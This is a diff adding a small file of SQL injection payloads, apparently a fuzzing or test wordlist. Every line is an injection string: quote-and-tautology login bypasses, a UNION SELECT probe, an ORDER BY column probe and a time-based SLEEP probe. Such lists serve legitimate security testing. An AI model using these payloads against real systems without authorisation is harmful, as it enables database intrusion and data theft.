@@ -1,0 +1,8 @@
+
+' OR 1=1-- 
+" OR 1=1-- 
+' OR '1'='1
+" OR "1"="1
+1' UNION SELECT NULL,NULL,NULL-- 
+1' ORDER BY 1-- 
+1' AND SLEEP(5)-- 
